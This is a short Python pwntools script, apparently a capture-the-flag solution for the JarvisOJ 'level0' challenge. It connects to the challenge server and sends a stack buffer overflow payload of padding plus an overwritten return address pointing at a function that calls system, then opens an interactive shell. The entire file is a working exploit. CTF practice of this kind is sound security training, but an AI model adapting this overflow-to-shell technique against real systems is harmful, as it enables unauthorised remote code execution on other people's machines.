#! /usr/bin/python

from pwn import *

p = remote('pwn2.jarvisoj.com',9881)
elf = ELF('./level0')

offset = 0x80
call_system = 0x0400596

payload = 'A' * 0x80 + 'deadbeef' + p64(call_system)
p.sendline(payload)

p.recvuntil('Hello, World\n')
p.interactive()
